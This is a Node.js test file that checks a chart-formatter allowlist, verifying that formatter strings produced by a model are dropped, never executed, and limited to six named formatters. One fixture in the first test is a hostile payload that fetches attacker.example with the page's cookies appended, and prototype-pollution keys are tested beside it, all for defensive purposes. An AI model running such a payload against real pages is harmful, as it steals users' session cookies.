// node --test: chart formatters are names we implement; model output is never run.
import { test } from "node:test";
import assert from "node:assert/strict";
import { readFile } from "node:fs/promises";

const SRC = new URL(
  "../../../samples/hydrolix/amplify-hydrolix-data-assistant-agentcore-strands/src/",
  import.meta.url,
);
const load = async (path) =>
  import(`data:text/javascript,${encodeURIComponent(await readFile(new URL(path, SRC), "utf8"))}`);
const { applyChartFormatters, CHART_FORMATTERS, CHART_FORMATTER_NAMES } = await load(
  "utils/chartFormatters.js",
);

test("a hostile formatter string is dropped and never executed", () => {
  globalThis.pwned = false;
  const hostile = [
    "function(){ globalThis.pwned = true; fetch('https://attacker.example/'+document.cookie) }",
    "(() => { globalThis.pwned = true })()",
    "globalThis.pwned = true",
    "constructor",
    "__proto__",
  ];
  for (const formatter of hostile) {
    const { configuration, dropped } = applyChartFormatters({
      options: { dataLabels: { enabled: true, formatter }, yaxis: [{ labels: { formatter } }] },
    });
    assert.equal(dropped, 2, formatter);
    assert.equal("formatter" in configuration.options.dataLabels, false);
    assert.equal("formatter" in configuration.options.yaxis[0].labels, false);
    assert.equal(configuration.options.dataLabels.enabled, true);
  }
  assert.equal(globalThis.pwned, false);
});

test("non-string and unknown formatters are dropped and counted", () => {
  const { configuration, dropped } = applyChartFormatters({
    a: { formatter: { toString: "x" } },
    b: { formatter: 12 },
    c: { formatter: "toFixed" },
    d: { formatter: "percent" },
  });
  assert.equal(dropped, 3);
  assert.equal(configuration.d.formatter, CHART_FORMATTERS.percent);
});

test("every allowlisted name renders as documented", () => {
  const pie = { seriesIndex: 1, dataPointIndex: -1, w: { config: { labels: ["NA", "EU"] } } };
  const bar = { dataPointIndex: 2, w: { config: {}, globals: { labels: ["a", "b", "Hired"] } } };
  assert.equal(CHART_FORMATTERS.fixed2(3.14159), "3.14");
  assert.equal(CHART_FORMATTERS.fixed2("2.5"), "2.50");
  assert.equal(CHART_FORMATTERS.fixed2("n/a"), "n/a");
  assert.equal(CHART_FORMATTERS.integer(41.6), "42");
  assert.equal(CHART_FORMATTERS.percent(94.123), "94.12%");
  assert.equal(CHART_FORMATTERS.currency(1036.75), "$1036.75");
  assert.equal(CHART_FORMATTERS.label_and_value(200, bar), "Hired: 200");
  assert.equal(CHART_FORMATTERS.label_and_percent(27.456, pie), "EU: 27.46%");
  assert.equal(CHART_FORMATTERS.label_and_value(5, undefined), ": 5");
  assert.deepEqual(
    [...CHART_FORMATTER_NAMES].sort(),
    ["currency", "fixed2", "integer", "label_and_percent", "label_and_value", "percent"],
  );
});

test("the chart prompt names exactly the allowlist and asks for no code", async () => {
  const { CHART_PROMPT } = await load("prompts/chartPrompt.js");
  const listed = CHART_PROMPT.match(/one of these names only: ([a-z0-9_, ]+)/)[1].split(", ");
  assert.deepEqual([...listed].sort(), [...CHART_FORMATTER_NAMES].sort());
  const examples = [...CHART_PROMPT.matchAll(/"formatter":\s*"([^"]+)"/g)].map((m) => m[1]);
  assert.ok(examples.length > 0 && examples.every((name) => CHART_FORMATTER_NAMES.includes(name)));
  assert.equal(/function\s*\(/.test(CHART_PROMPT), false);
});
